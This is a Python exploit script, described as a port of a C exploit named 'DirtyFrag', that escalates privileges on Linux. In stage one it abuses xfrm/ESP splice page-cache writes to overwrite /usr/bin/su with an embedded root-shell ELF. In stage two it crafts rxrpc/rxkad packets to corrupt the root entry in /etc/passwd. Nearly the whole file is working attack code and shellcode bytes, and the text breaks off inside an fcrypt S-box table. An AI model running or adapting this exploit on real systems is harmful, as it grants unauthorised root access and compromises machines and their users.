#!/usr/bin/env python3
"""
DirtyFrag LPE — Python3 port of exp.c
Two-stage exploit:
  Stage 1 : xfrm/ESP page-cache write → overwrite /usr/bin/su with shellcode ELF
  Stage 2 : rxrpc/rxkad page-cache write → corrupt /etc/passwd root entry (uid=0, empty passwd)
"""

import os, sys, socket, struct, time, ctypes, ctypes.util
import subprocess, fcntl, termios, select, pty, signal
from ctypes import c_int, c_uint, c_ulong, c_uint8, c_uint32, c_uint64

# ── libc ──────────────────────────────────────────────────────────────────────
_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

def _check(ret, fn="syscall"):
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"{fn}: {os.strerror(err)}")
    return ret

# raw syscall wrappers
_syscall = _libc.syscall
_syscall.restype  = ctypes.c_long
_syscall.argtypes = [ctypes.c_long, ctypes.c_long,
                     ctypes.c_long, ctypes.c_long, ctypes.c_long]

# unshare
_unshare = _libc.unshare
_unshare.restype  = c_int
_unshare.argtypes = [c_int]

# vmsplice
_vmsplice = _libc.vmsplice
_vmsplice.restype  = ctypes.c_ssize_t
_vmsplice.argtypes = [c_int, ctypes.c_void_p, ctypes.c_size_t, c_uint]

# splice
_splice = _libc.splice
_splice.restype  = ctypes.c_ssize_t
_splice.argtypes = [c_int, ctypes.POINTER(ctypes.c_int64),
                    c_int, ctypes.POINTER(ctypes.c_int64),
                    ctypes.c_size_t, c_uint]

# ── constants ─────────────────────────────────────────────────────────────────
CLONE_NEWUSER    = 0x10000000
CLONE_NEWNET     = 0x40000000
SPLICE_F_MOVE    = 0x01
SPLICE_F_NONBLOCK= 0x02

NETLINK_XFRM     = 6
XFRM_MSG_NEWSA   = 0x10  # RTM base + type
NLM_F_REQUEST    = 0x01
NLM_F_ACK        = 0x04
NLMSG_ERROR      = 0x02
XFRM_MODE_TRANSPORT = 0
IPPROTO_ESP      = 50

# XFRM attr types
XFRMA_ALG_AUTH_TRUNC = 10
XFRMA_ALG_CRYPT      = 3
XFRMA_ENCAP          = 6
XFRMA_REPLAY_ESN_VAL = 20

UDP_ENCAP            = 100
UDP_ENCAP_ESPINUDP   = 2
SOL_UDP              = 17

ENC_PORT   = 4500
SEQ_VAL    = 200
REPLAY_SEQ = 100

TARGET_PATH  = "/usr/bin/su"
PATCH_OFFSET = 0
PAYLOAD_LEN  = 192
ENTRY_OFFSET = 0x78

# ── minimal root-shell ELF (192 bytes) ────────────────────────────────────────
SHELL_ELF = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
])

# ── helpers ───────────────────────────────────────────────────────────────────
verbose = bool(os.getenv("DIRTYFRAG_VERBOSE"))

def log(msg):  print(f"[+] {msg}", file=sys.stderr)
def warn(msg): print(f"[!] {msg}", file=sys.stderr)
def dbg(msg):
    if verbose: print(f"[.] {msg}", file=sys.stderr)

def write_proc(path, data):
    try:
        with open(path, "w") as f:
            f.write(data)
        return True
    except Exception as e:
        dbg(f"write_proc({path}): {e}")
        return False

# ── netlink helpers ───────────────────────────────────────────────────────────
def nlmsg_align(n):      return (n + 3) & ~3
def rta_length(payload): return 4 + payload  # sizeof(rtattr) = 4

def build_nlmsg(msg_type, flags, pid, seq, data: bytes) -> bytes:
    length = 16 + len(data)
    return struct.pack("IHHII", length, msg_type, flags, seq, pid) + data

def build_rta(rta_type, data: bytes) -> bytes:
    length = 4 + len(data)
    pad = (nlmsg_align(length) - length)
    return struct.pack("HH", length, rta_type) + data + b"\x00" * pad

# ── Stage 1: xfrm ESP page-cache write ───────────────────────────────────────

def setup_userns_netns():
    real_uid = os.getuid()
    real_gid = os.getgid()
    ret = _unshare(CLONE_NEWUSER | CLONE_NEWNET)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "unshare")
    write_proc("/proc/self/setgroups", "deny")
    write_proc("/proc/self/uid_map",   f"0 {real_uid} 1")
    write_proc("/proc/self/gid_map",   f"0 {real_gid} 1")
    # bring lo up
    try:
        import subprocess
        subprocess.run(["ip","link","set","lo","up"],
                       capture_output=True, timeout=3)
    except Exception:
        pass

def xfrm_usersa_info(spi: int, patch_seqhi: int) -> bytes:
    """Pack struct xfrm_usersa_info (172 bytes on x86_64)"""
    daddr   = socket.inet_aton("127.0.0.1")
    saddr   = socket.inet_aton("127.0.0.1")

    # xfrm_address_t is a union[16]; xfrm_id = daddr[16] + spi[4] + proto[1] + pad[3]
    # We use AF_INET so only first 4 bytes of addr matter; rest zero.
    def xfrm_addr(a4): return a4 + b"\x00" * 12   # 16 bytes

    xfrm_id  = xfrm_addr(daddr) + struct.pack(">I", spi) + bytes([IPPROTO_ESP]) + b"\x00"*3
    xs_saddr = xfrm_addr(saddr)

    # xfrm_lifetime_cfg: 4 x uint64 (soft_byte, hard_byte, soft_pkt, hard_pkt)
    UINT64_MAX = (1 << 64) - 1
    lft  = struct.pack("QQQQ", UINT64_MAX, UINT64_MAX, UINT64_MAX, UINT64_MAX)
    # xfrm_lifetime_cur: 4 x uint64 (bytes, packets, add_time, use_time)
    lcur = struct.pack("QQQQ", 0, 0, 0, 0)

    # xfrm_stats: 3 x uint32
    stats = struct.pack("III", 0, 0, 0)

    # xfrm_selector: daddr[16] + saddr[16] + dport[2] + dport_mask[2] + sport[2] + sport_mask[2]
    #                + proto[1] + ifindex[4] + user[4] + family[2] + prefixlen_d[1] + prefixlen_s[1] + pad[2]
    sel = (xfrm_addr(daddr) + xfrm_addr(saddr)
           + struct.pack("HHHH", 0, 0, 0, 0)
           + bytes([0])                             # proto
           + struct.pack("I", 0)                    # ifindex
           + struct.pack("I", 0)                    # user
           + struct.pack("HBBxx", socket.AF_INET, 32, 32))  # family, prefix_d, prefix_s

    # rest of xfrm_usersa_info fields
    reqid  = 0x1234
    mode   = XFRM_MODE_TRANSPORT
    # flags: XFRM_STATE_ESN = 0x100
    flags  = 0x100
    # struct layout (after sel): id, saddr, lft, curlft, stats, seq, reqid,
    #                             family, replay_window, flags, mode, replay_window, ...
    # Simplified — kernel only reads what it needs for NEWSA; pack as flat bytes.
    body = (sel + xfrm_id + xs_saddr + lft + lcur + stats
            + struct.pack("IHHBBBB",
                          0,            # seq
                          reqid,        # reqid
                          socket.AF_INET, # family
                          0,            # replay_window
                          flags & 0xFF,
                          mode,
                          0, 0))        # pad
    return body

def add_xfrm_sa_netlink(spi: int, patch_seqhi: int) -> bool:
    sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
    sk.bind((0, 0))

    # --- xfrm_usersa_info body (simplified inline struct) ---
    daddr4  = socket.inet_aton("127.0.0.1")
    saddr4  = socket.inet_aton("127.0.0.1")
    def xa(a4): return a4 + b"\x00"*12

    UINT64_MAX = (1<<64)-1

    # pack the whole xfrm_usersa_info manually (256 bytes total in kernel)
    # We use a bytearray and fill what the kernel checks for NEWSA.
    xs = bytearray(256)
    # sel.daddr.a4 @ 0
    xs[0:4]   = daddr4
    # sel.saddr.a4 @ 16
    xs[16:20] = saddr4
    # sel.family @ 44
    struct.pack_into("H", xs, 44, socket.AF_INET)
    # sel.prefixlen_d @ 46, sel.prefixlen_s @ 47
    xs[46] = 32; xs[47] = 32
    # id.daddr.a4 @ 48 (sizeof xfrm_selector = 56 on x86_64)
    xs[48:52]  = daddr4
    # id.spi @ 64
    struct.pack_into(">I", xs, 64, spi)
    # id.proto @ 68
    xs[68] = IPPROTO_ESP
    # saddr.a4 @ 72
    xs[72:76]  = saddr4
    # lft soft_byte @ 88
    struct.pack_into("Q", xs, 88,  UINT64_MAX)
    struct.pack_into("Q", xs, 96,  UINT64_MAX)
    struct.pack_into("Q", xs, 104, UINT64_MAX)
    struct.pack_into("Q", xs, 112, UINT64_MAX)
    # family @ 184
    struct.pack_into("H", xs, 184, socket.AF_INET)
    # mode @ 187
    xs[187] = XFRM_MODE_TRANSPORT
    # reqid @ 188
    struct.pack_into("I", xs, 188, 0x1234)
    # flags @ 196 — XFRM_STATE_ESN = 0x100
    struct.pack_into("I", xs, 196, 0x100)

    payload = bytes(xs)

    # --- RTAs ---
    # XFRMA_ALG_AUTH_TRUNC: struct xfrm_algo_auth + 32-byte key
    alg_auth_name = b"hmac(sha256)\x00"
    alg_auth_name = alg_auth_name.ljust(64, b"\x00")
    alg_auth  = alg_auth_name + struct.pack("II", 32*8, 128) + b"\xAA"*32
    payload  += build_rta(XFRMA_ALG_AUTH_TRUNC, alg_auth)

    # XFRMA_ALG_CRYPT: struct xfrm_algo + 16-byte key
    alg_enc_name = b"cbc(aes)\x00"
    alg_enc_name = alg_enc_name.ljust(64, b"\x00")
    alg_enc   = alg_enc_name + struct.pack("I", 16*8) + b"\xBB"*16
    payload  += build_rta(XFRMA_ALG_CRYPT, alg_enc)

    # XFRMA_ENCAP: struct xfrm_encap_tmpl
    enc_tmpl  = struct.pack("HHH", UDP_ENCAP_ESPINUDP,
                            socket.htons(ENC_PORT),
                            socket.htons(ENC_PORT)) + b"\x00"*18
    payload  += build_rta(XFRMA_ENCAP, enc_tmpl)

    # XFRMA_REPLAY_ESN_VAL: struct xfrm_replay_state_esn + 4-byte bmp
    esn       = struct.pack("IIIII", 1, 0, REPLAY_SEQ, 0, patch_seqhi)
    esn      += struct.pack("I", 32)   # replay_window
    esn      += struct.pack("I", 0)    # bmp[0]
    payload  += build_rta(XFRMA_REPLAY_ESN_VAL, esn)

    # NLMSG_LENGTH(sizeof(xfrm_usersa_info)) + RTAs
    XFRM_MSG_NEWSA_T = 0x10
    msg = build_nlmsg(XFRM_MSG_NEWSA_T,
                      NLM_F_REQUEST | NLM_F_ACK,
                      os.getpid(), 1, payload)

    try:
        sk.send(msg)
        resp = sk.recv(4096)
        # parse NLMSG_ERROR
        nh_type = struct.unpack_from("H", resp, 4)[0]
        if nh_type == NLMSG_ERROR:
            err = struct.unpack_from("i", resp, 16)[0]
            if err != 0:
                sk.close(); return False
        sk.close(); return True
    except Exception as e:
        dbg(f"add_xfrm_sa: {e}")
        sk.close(); return False


def _vmsplice_buf(pipe_w: int, data: bytes) -> int:
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    iov = struct.pack("Pn", ctypes.addressof(buf), len(data))
    iov_buf = (ctypes.c_char * len(iov)).from_buffer_copy(iov)
    ret = _vmsplice(pipe_w, ctypes.addressof(iov_buf), 1, 0)
    return int(ret)


def do_one_write_xfrm(path: str, offset: int, spi: int) -> bool:
    sk_recv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk_recv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk_recv.bind(("127.0.0.1", ENC_PORT))
    sk_recv.setsockopt(socket.IPPROTO_UDP, UDP_ENCAP, UDP_ENCAP_ESPINUDP)

    sk_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk_send.connect(("127.0.0.1", ENC_PORT))

    file_fd = os.open(path, os.O_RDONLY)

    pr, pw = os.pipe()
    try:
        # Build 24-byte ESP header: SPI + SEQ + 16 bytes padding
        hdr  = struct.pack(">II", spi, SEQ_VAL) + b"\xCC" * 16

        n = _vmsplice_buf(pw, hdr)
        if n != len(hdr):
            return False

        off_c = ctypes.c_int64(offset)
        s = _splice(file_fd, ctypes.byref(off_c), pw, None, 16, SPLICE_F_MOVE)
        if s != 16:
            return False

        s = _splice(pr, None, sk_send.fileno(), None, 24 + 16, SPLICE_F_MOVE)
        time.sleep(0.15)
        return True
    except Exception as e:
        dbg(f"do_one_write_xfrm: {e}")
        return False
    finally:
        os.close(pr); os.close(pw)
        os.close(file_fd)
        sk_send.close(); sk_recv.close()


def verify_byte(path: str, offset: int, want: int) -> bool:
    with open(path, "rb") as f:
        f.seek(offset)
        b = f.read(1)
    return len(b) == 1 and b[0] == want


def corrupt_su() -> bool:
    setup_userns_netns()
    time.sleep(0.1)

    log(f"Installing {PAYLOAD_LEN // 4} xfrm SAs …")
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBE10 + i
        word = SHELL_ELF[i*4 : i*4+4]
        seqhi = struct.unpack(">I", word)[0]
        if not add_xfrm_sa_netlink(spi, seqhi):
            warn(f"add_xfrm_sa #{i} failed")
            return False

    log("Writing ELF payload to page-cache via ESP …")
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBE10 + i
        off = PATCH_OFFSET + i * 4
        if not do_one_write_xfrm(TARGET_PATH, off, spi):
            dbg(f"do_one_write #{i} at off=0x{off:x} failed (non-fatal)")

    return True


def stage1_su_lpe(argv):
    log(f"=== Stage 1: DirtyFrag / xfrm → overwrite {TARGET_PATH} ===")
    pid = os.fork()
    if pid == 0:
        ok = corrupt_su()
        os._exit(0 if ok else 2)
    _, status = os.waitpid(pid, 0)
    if not (os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0):
        warn(f"corruption stage failed (status=0x{status:x})")
        return 1
    if not (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) and
            verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xFF)):
        warn("post-write verify failed — target unchanged")
        return 1
    log(f"{TARGET_PATH} patched — entry=0x{ENTRY_OFFSET:x} → shellcode")
    return 0


# ══════════════════════════════════════════════════════════════════════════════
# Stage 2: rxrpc/rxkad → corrupt /etc/passwd
# ══════════════════════════════════════════════════════════════════════════════

AF_RXRPC  = 33
PF_RXRPC  = AF_RXRPC
SOL_RXRPC = 272
AF_ALG    = 38
SOL_ALG   = 279
SYS_add_key   = 248
SYS_keyctl    = 250
KEYCTL_INVALIDATE = 3

RXRPC_SECURITY_KEY        = 1
RXRPC_MIN_SECURITY_LEVEL  = 2
RXRPC_SECURITY_AUTH       = 2
RXRPC_USER_CALL_ID        = 1

RXRPC_PACKET_TYPE_DATA      = 1
RXRPC_PACKET_TYPE_CHALLENGE = 6
RXRPC_LAST_PACKET           = 0x04
RXRPC_CHANNELMASK           = 3
RXRPC_CIDSHIFT              = 2

ALG_SET_KEY = 1
ALG_SET_IV  = 2
ALG_SET_OP  = 3
ALG_OP_DECRYPT = 0
ALG_OP_ENCRYPT = 1

SESSION_KEY = bytearray([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08])
trigger_seq = 0


def do_unshare_userns_netns():
    real_uid = os.getuid()
    real_gid = os.getgid()
    _check(_unshare(CLONE_NEWUSER | CLONE_NEWNET), "unshare")
    log(f"unshare(USER|NET) OK, real uid={real_uid}")
    write_proc("/proc/self/setgroups", "deny")
    write_proc("/proc/self/uid_map",   f"{real_uid} {real_uid} 1")
    write_proc("/proc/self/gid_map",   f"{real_gid} {real_gid} 1")
    try:
        subprocess.run(["ip","link","set","lo","up"],
                       capture_output=True, timeout=3)
        log("lo UP in new netns")
    except Exception:
        pass


def add_key(type_: str, desc: str, payload: bytes, keyring: int) -> int:
    t  = ctypes.create_string_buffer(type_.encode())
    d  = ctypes.create_string_buffer(desc.encode())
    p  = ctypes.create_string_buffer(payload)
    ret = _syscall(SYS_add_key,
                   ctypes.cast(t, ctypes.c_long).value,
                   ctypes.cast(d, ctypes.c_long).value,
                   ctypes.cast(p, ctypes.c_long).value,
                   len(payload), keyring)
    return int(ret)


def build_rxrpc_v1_token(session_key: bytes) -> bytes:
    now     = int(time.time())
    expires = now + 86400
    cell    = b"evil"
    clen    = len(cell)
    pad     = (4 - (clen & 3)) & 3
    buf     = struct.pack(">I", 0)          # flags
    buf    += struct.pack(">I", clen) + cell + b"\x00"*pad
    buf    += struct.pack(">I", 1)          # ntoken

    tok  = struct.pack(">I", 2)             # sec_ix = RXKAD
    tok += struct.pack(">I", 0)             # vice_id
    tok += struct.pack(">I", 1)             # kvno
    tok += bytes(session_key)[:8]           # session_key (8 B)
    tok += struct.pack(">III", now, expires, 1)   # start, end, primary_flag
    tok += struct.pack(">I", 8) + b"\xCC"*8      # ticket_len + ticket

    buf += struct.pack(">I", len(tok)) + tok
    return buf


def add_rxrpc_key(desc: str, session_key: bytes) -> int:
    KEY_SPEC_PROCESS_KEYRING = -2
    payload = build_rxrpc_v1_token(session_key)
    return add_key("rxrpc", desc, payload, KEY_SPEC_PROCESS_KEYRING)


def keyctl_invalidate(key_id: int):
    _syscall(SYS_keyctl, KEYCTL_INVALIDATE, key_id, 0, 0)


# ── AF_ALG pcbc(fcrypt) ───────────────────────────────────────────────────────
def alg_open_pcbc_fcrypt(key8: bytes) -> socket.socket:
    s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    # struct sockaddr_alg: family(2) + type(14) + feat(4) + mask(4) + name(64)
    sa = struct.pack("H14sII64s",
                     AF_ALG,
                     b"skcipher",
                     0, 0,
                     b"pcbc(fcrypt)")
    s.bind(sa)
    s.setsockopt(SOL_ALG, ALG_SET_KEY, key8)
    return s


def alg_op(alg_s: socket.socket, op: int, iv8: bytes,
           data: bytes) -> bytes:
    op_fd_raw = alg_s.accept()[0]
    op_fd = op_fd_raw.fileno()

    # build cmsg: ALG_SET_OP + ALG_SET_IV
    cmsg_op = struct.pack("nHHi",
                          20,   # cmsg_len (nHH = 8+4+4+4?)
                          SOL_ALG, ALG_SET_OP, op)
    iv_struct   = struct.pack("I8s", 8, iv8)
    cmsg_iv_len = 8 + 4 + len(iv_struct)   # len+level+type + data
    cmsg_iv  = struct.pack("nHH", cmsg_iv_len, SOL_ALG, ALG_SET_IV) + iv_struct

    # Use sendmsg via Python's socket (needs CMSG support)
    op_sock = socket.fromfd(op_fd, AF_ALG, socket.SOCK_SEQPACKET)
    op_sock.sendmsg([data], [(SOL_ALG, ALG_SET_OP,  struct.pack("I", op)),
                             (SOL_ALG, ALG_SET_IV,  struct.pack("I8s", 8, iv8))])
    out = op_sock.recv(len(data))
    op_sock.close()
    op_fd_raw.close()
    return out


def compute_csum_iv(epoch: int, cid: int, sec_ix: int,
                    key8: bytes) -> bytes:
    s   = alg_open_pcbc_fcrypt(key8)
    inp = struct.pack(">IIII", epoch, cid, 0, sec_ix)
    out = alg_op(s, ALG_OP_ENCRYPT, key8, inp)
    s.close()
    return out[8:16]


def compute_cksum(cid: int, call_id: int, seq: int,
                  key8: bytes, csum_iv: bytes) -> int:
    s   = alg_open_pcbc_fcrypt(key8)
    x   = ((cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT)) | (seq & 0x3FFFFFFF)
    inp = struct.pack(">II", call_id, x)
    out = alg_op(s, ALG_OP_ENCRYPT, csum_iv, inp)
    s.close()
    y = struct.unpack(">I", out[4:8])[0]
    v = (y >> 16) & 0xFFFF
    return v if v else 1


# ── rxrpc wire structs ────────────────────────────────────────────────────────
def pack_rxrpc_wire_header(epoch, cid, callNumber, seq, serial,
                            pkt_type, flags, userStatus,
                            securityIndex, cksum, serviceId) -> bytes:
    return struct.pack(">IIIIIBBBBHHxx",
                       epoch, cid, callNumber, seq, serial,
                       pkt_type, flags, userStatus, securityIndex,
                       cksum, serviceId)


def setup_rxrpc_client(local_port: int, keyname: str) -> socket.socket:
    fd = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.PF_INET)
    fd.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEY, keyname.encode())
    fd.setsockopt(SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
                  struct.pack("I", RXRPC_SECURITY_AUTH))
    # struct sockaddr_rxrpc
    srx = struct.pack("HHI16sH",
                      AF_RXRPC, 0, 0,
                      socket.SOCK_DGRAM.to_bytes(4, "little") +
                      struct.pack(">HI", local_port,
                                  0x7F000001) + b"\x00"*6,
                      socket.AF_INET)
    # Simpler: use raw bind via ctypes if needed — skip for now, Python socket API
    fd.bind(("127.0.0.1", local_port))
    log(f"AF_RXRPC client bound :{local_port}")
    return fd


def setup_udp_server(port: int) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("127.0.0.1", port))
    log(f"UDP fake-server bound :{port}")
    return s


def udp_recv_timeout(s: socket.socket, cap: int,
                     timeout_ms: int):
    r, _, _ = select.select([s], [], [], timeout_ms / 1000.0)
    if not r:
        return None, None
    data, addr = s.recvfrom(cap)
    return data, addr


def do_one_trigger(target_fd: int, splice_off: int,
                   splice_len: int) -> bool:
    global trigger_seq, SESSION_KEY

    keyname = f"evil{trigger_seq}"
    trigger_seq += 1

    key = add_rxrpc_key(keyname, bytes(SESSION_KEY))
    if key < 0:
        return False

    port_s = 7777 + (trigger_seq * 2 % 200)
    port_c = port_s + 1
    svc_id = 1234

    try:
        udp_srv = setup_udp_server(port_s)
    except Exception:
        keyctl_invalidate(key)
        return False

    # initiate AF_RXRPC call (best-effort)
    try:
        cli_fd = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.PF_INET)
        cli_fd.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEY, keyname.encode())
        cli_fd.setsockopt(SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
                          struct.pack("I", RXRPC_SECURITY_AUTH))
        cli_fd.bind(("127.0.0.1", port_c))
    except Exception:
        udp_srv.close(); keyctl_invalidate(key)
        return False

    # send DATA to trigger handshake
    try:
        cli_fd.setblocking(False)
        cli_fd.sendto(b"PINGPING",
                      (AF_RXRPC, svc_id, "127.0.0.1", port_s))
    except BlockingIOError:
        pass
    except Exception:
        pass
    cli_fd.setblocking(True)

    # receive DATA from client → parse wire header
    pkt, cli_addr = udp_recv_timeout(udp_srv, 2048, 1500)
    if pkt is None or len(pkt) < 28:
        cli_fd.close(); udp_srv.close(); keyctl_invalidate(key)
        return False

    epoch, cid, callN, seq, serial = struct.unpack_from(">IIIII", pkt, 0)
    svc_in    = struct.unpack_from(">H", pkt, 22)[0]
    cli_port  = cli_addr[1]

    # send CHALLENGE
    ch_hdr = pack_rxrpc_wire_header(
        epoch, cid, 0, 0, 0x10000,
        RXRPC_PACKET_TYPE_CHALLENGE, 0, 0, 2, 0, svc_in)
    ch_body = struct.pack(">IIII", 2, 0xDEADBEEF, 1, 0)
    udp_srv.sendto(ch_hdr + ch_body, ("127.0.0.1", cli_port))

    # drain RESPONSE
    for _ in range(4):
        d, _ = udp_recv_timeout(udp_srv, 2048, 500)
        if d is None:
            break

    # compute cksum
    csum_iv = compute_csum_iv(epoch, cid, 2, bytes(SESSION_KEY))
    cksum   = compute_cksum(cid, callN, 1, bytes(SESSION_KEY), csum_iv)

    # build malicious DATA header
    mal_hdr = pack_rxrpc_wire_header(
        epoch, cid, callN, 1, 0x42000,
        RXRPC_PACKET_TYPE_DATA, RXRPC_LAST_PACKET, 0, 2,
        cksum, svc_in)

    # connect udp_srv → client
    udp_srv.connect(("127.0.0.1", cli_port))

    # pipe + vmsplice header + splice file → pipe → udp_srv
    pr, pw = os.pipe()
    try:
        n = _vmsplice_buf(pw, mal_hdr)
        if n < 0:
            raise OSError("vmsplice")

        off_c = ctypes.c_int64(splice_off)
        s = _splice(target_fd, ctypes.byref(off_c), pw, None,
                    splice_len, SPLICE_F_NONBLOCK)

        _splice(pr, None, udp_srv.fileno(), None,
                len(mal_hdr) + splice_len, 0)
    except Exception as e:
        dbg(f"splice chain: {e}")
        os.close(pr); os.close(pw)
        cli_fd.close(); udp_srv.close(); keyctl_invalidate(key)
        return False

    os.close(pr); os.close(pw)

    # recvmsg to trigger kernel verify_packet
    cli_fd.setblocking(False)
    for _ in range(5):
        try:
            cli_fd.recvmsg(2048)
            break
        except BlockingIOError:
            time.sleep(0.02)
        except Exception:
            break
    cli_fd.setblocking(True)

    cli_fd.close(); udp_srv.close(); keyctl_invalidate(key)
    return True


# ── fcrypt userspace (port of crypto/fcrypt.c) ────────────────────────────────
_FC_S0_RAW = bytes([
    0xea,0x7f,0xb2,0x64,0x9d,0xb0,0xd9,0x11,0xcd,0x86,0x86,0x91,0x0a,0xb2,0x93,0x06,
    0x0e,0x06,0xd2,0x65,0x73,0xc5,0x28,0x60,0xf2,0x20,0xb5,0x38,0x7e,0xda,0x9f,0xe3,
    0xd2,0xcf,0xc4,0x3c,0x61,0xff,0x4a,0x4a,0x35,0xac,0xaa,0x5f,0x2b,0xbb,0xbc,0x53,
    0x4e,0x9d,0x78,0xa3,0xdc,0x09,0x32,0x10,0xc6,0x6f,0x66,0xd6,0xab,0xa9,0xaf,0xfd,
    0x3b,0x95,0xe8,0x34,0x9a,0x81,0x72,0x80,0x9c,0xf3,0xec,0xda,0x9f,0x26,0x76,0x15,
    0x3e,0x55,0x4d,0xde,0x84,0xee,0xad,0xc7,0xf1,0x6b,0x3d,0xd3,0x04,0x49,0xaa,0x24,
    0x0b,0x8a,0x83,0xba,0xfa,0x85,0xa0,0xa8,0xb1,0xd4,0x01,0xd8,0x70,0x64,0xf0,0x51,
    0xd2,0xc3,0xa7,0x75,0x8c,0xa5,0x64,0xef,0x10,0x4e,0xb7,0xc6,0x61,0x03,0xeb,0x44,
    0x3d,0xe5,0xb3,0x5b,0xae,0xd5,0xad,0x1d,0xfa,0x5a,0x1e,0x33,0xab,0x93,0xa2,0xb7,
    0xe7,0xa8,0x45,0xa4,0xcd,0x29,0x63,0x44,0xb6,0x69,0x7e,0x2e,0x62,0x03,0xc8,0xe0,
    0x17,0xbb,0xc7,0xf3,0x3f,0x36,0xba,0x71,0x8e,0x97,0x65,0x60,0x69,0xb6,0xf6,0xe6,
    0x6e,0xe0,0x81,0x59,0xe8,0xaf,0xdd,0x95,0x22,0x99,0xfd,0x63,0x19,0x74,0x61,0xb1,
    0xb6,0x5b,0xae,0x54,0xb3,0x70,0xff,0xc6,0x3b,0x3e,0xc1,0xd7,0xe1,0x0e,0x76,0xe5,
    0x36,0x4f,0x59,0xc7,0x08,0x6e,0x82,0xa6,0x93,0xc4,0xaa,0x26,0x49,0xe0,0x21,0x64,
    0x07,0x9f,0x64,0x81,0x9c,0xbf,0xf9,0xd1,0x43,0xf8,0xb6,0xb9,0xf1,0x24,0x75,0x03,
    0xe4,0xb0,0x99,0x46,0x3d,0xf5,0xd1,0x39,0x72,0x12,0xf6,0xba,0x0c,0x0d,0x42,0x2e,
])
_FC_S1_RAW = bytes([
    0x77,0x14,0xa6,0xfe,0xb2,0x5e,0x8c,0x3e,0x67,0x6c,0xa1,0x0d,0xc2,0xa2,0xc1,0x85,
    0x6c,0x7b,0x67,0xc6,0x23,0xe3,0xf2,0x89,0x50,0x9c,0x03,0xb7,0x73,0xe6,0xe1,0x39,
    0x31,0x2c,0x27,0x9f,0xa5,0x69,0x44,0xd6,0x23,0x83,0x98,0x7d,0x3c,0xb4,0x2d,0x99,
    0x1c,0x1f,0x8c,0x20,0x03,0x7c,0x5f,0xad,0xf4,0xfa,0x95,0xca,0x76,0x44,0xcd,0xb6,
    0xb8,0xa1,0xa1,0xbe,0x9e,0x54,0x8f,0x0b,0x16,0x74,0x31,0x8a,0x23,0x17,0x04,0xfa,
    0x79,0x84,0xb1,0xf5,0x13,0xab,0xb5,0x2e,0xaa,0x0c,0x60,0x6b,0x5b,0xc4,0x4b,0xbc,
    0xe2,0xaf,0x45,0x73,0xfa,0xc9,0x49,0xcd,0x00,0x92,0x7d,0x97,0x7a,0x18,0x60,0x3d,
    0xcf,0x5b,0xde,0xc6,0xe2,0xe6,0xbb,0x8b,0x06,0xda,0x08,0x15,0x1b,0x88,0x6a,0x17,
    0x89,0xd0,0xa9,0xc1,0xc9,0x70,0x6b,0xe5,0x43,0xf4,0x68,0xc8,0xd3,0x84,0x28,0x0a,
    0x52,0x66,0xa3,0xca,0xf2,0xe3,0x7f,0x7a,0x31,0xf7,0x88,0x94,0x5e,0x9c,0x63,0xd5,
    0x24,0x66,0xfc,0xb3,0x57,0x25,0xbe,0x89,0x44,0xc4,0xe0,0x8f,0x23,0x3c,0x12,0x52,
    0xf5,0x1e,0xf4,0xcb,0x18,0x33,0x1f,0xf8,0x69,0x10,0x9d,0xd3,0xf7,0x28,0xf8,0x30,
    0x05,0x5e,0x32,0xc0,0xd5,0x19,0xbd,0x45,0x8b,0x5b,0xfd,0xbc,0xe2,0x5c,0xa9,0x96,
    0xef,0x70,0xcf,0xc2,0x2a,0xb3,0x61,0xad,0x80,0x48,0x81,0xb7,0x1d,0x43,0xd9,0xd7,
